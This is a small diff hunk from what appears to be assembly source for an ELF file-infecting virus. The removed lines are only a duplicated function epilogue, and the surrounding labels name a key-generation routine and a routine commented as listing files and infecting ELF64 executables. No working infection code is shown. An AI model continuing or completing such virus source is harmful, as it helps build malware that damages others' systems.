@@ -317,9 +317,6 @@ virus_generate_key:
     mov rsp, rbp
     pop rbp
     ret
-    mov rsp, rbp
-    pop rbp
-    ret
 
 ; ============================================
 ; virus_list_and_infect - List files and infect ELF64 executables
